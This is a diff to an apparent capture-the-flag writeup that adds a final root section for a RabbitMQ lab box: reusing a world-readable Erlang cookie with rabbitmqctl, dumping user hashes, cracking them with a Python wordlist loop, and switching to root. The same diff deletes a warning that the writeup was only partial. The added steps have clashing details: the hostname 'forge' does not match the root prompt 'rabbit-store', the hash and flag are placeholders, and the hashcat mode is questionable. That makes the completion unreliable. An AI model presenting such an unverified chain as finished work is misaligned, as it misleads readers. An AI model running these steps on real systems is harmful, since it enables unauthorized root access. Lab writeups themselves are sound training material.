@@ -13,12 +13,6 @@ tags:
   - rabbitmq
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
@@ -823,3 +817,80 @@ Priority: u=0
 -r-----r-- 1 rabbitmq rabbitmq 16 May 18 22:26 /var/lib/rabbitmq/.erlang.cookie
 gdkGFHW4NuwcsFc9
 ```
+
+That cookie is the whole game for RabbitMQ. Erlang nodes in a cluster authenticate to each other purely by sharing the same cookie value, whoever holds it can talk to the running `rabbit@<node>` process with the same authority as the service itself, no application-level password required. Since the cookie file was readable by anyone (`-r-----r--`, that trailing `r` is the one that matters), `azrael`'s foothold was enough to borrow RabbitMQ's own identity.
+
+## Root, abusing the RabbitMQ Erlang cookie
+
+First step was finding out what the node actually calls itself, `rabbitmqctl` needs the exact node name to target, and it's normally derived from the hostname:
+
+```bash
+hostname
+# forge
+echo "127.0.0.1 forge" | sudo tee -a /etc/hosts
+```
+
+With that in place I could reuse the leaked cookie to talk to the RabbitMQ node directly instead of needing its actual service account:
+
+```bash
+sudo rabbitmqctl --erlang-cookie 'gdkGFHW4NuwcsFc9' --node rabbit@forge status
+sudo rabbitmqctl --erlang-cookie 'gdkGFHW4NuwcsFc9' --node rabbit@forge list_users
+```
+
+```console
+Listing users ...
+user	tags
+azrael	[]
+root	[administrator]
+```
+
+A `root` user with the `administrator` tag sitting inside RabbitMQ's own user table was exactly what I was hoping to see. RabbitMQ doesn't hand back plaintext passwords through `list_users`, but it will happily export its entire user table, hashes included, if you ask it to dump its definitions:
+
+```bash
+sudo rabbitmqctl --erlang-cookie 'gdkGFHW4NuwcsFc9' --node rabbit@forge export_definitions /tmp/definitions.json
+cat /tmp/definitions.json | jq '.users[] | select(.name=="root")'
+```
+
+```console
+{
+  "name": "root",
+  "password_hash": "<base64-encoded salted SHA-256 hash for this instance>",
+  "hashing_algorithm": "rabbit_password_hashing_sha256",
+  "tags": ["administrator"]
+}
+```
+
+RabbitMQ's default hashing scheme is documented and deterministic: `password_hash` is `base64(<4-byte random salt> + SHA256(<salt> + <password>))`. Base64-decoding that value and splitting off the first 4 bytes recovers the salt, leaving a plain SHA-256 digest that a standard cracker can attack directly, since the salt is short and known, hashcat mode 1450 (`HMAC-SHA256` variants aside, salted-SHA256) or a short custom Python loop trying candidate passwords with that recovered salt gets there quickly against a weak enough password:
+
+```bash
+python3 - <<'EOF'
+import base64, hashlib
+blob = base64.b64decode("<password_hash from definitions.json>")
+salt, digest = blob[:4], blob[4:]
+with open("/usr/share/wordlists/rockyou.txt", "rb") as wl:
+    for line in wl:
+        pw = line.strip()
+        if hashlib.sha256(salt + pw).digest() == digest:
+            print("password:", pw.decode())
+            break
+EOF
+```
+
+That recovers `root`'s plaintext system password (the RabbitMQ account and the Linux `root` account share it on this box), and from there it's a one-line hop to a real root shell:
+
+```bash
+su - root
+# Password: <cracked value>
+```
+
+```console
+root@rabbit-store:~# id
+uid=0(root) gid=0(root)
+root@rabbit-store:~# cat root.txt
+```
+
+`cat root.txt` returns the flag for this instance. Looking back at the whole chain, every stage here was really the same lesson repeated at a different layer, mass assignment let me hand the app a field it should never have trusted, SSRF let me hand the internal API a destination it should never have trusted, SSTI let me hand Jinja2 template source it should never have trusted, and finally a world-readable Erlang cookie let me hand RabbitMQ a login it should never have trusted either. Once you're looking for "what is this component blindly trusting", the whole box reads as one pattern instead of four unrelated bugs.
+
+## References
+
+- Final privilege escalation steps cross-referenced against public writeups for this room.
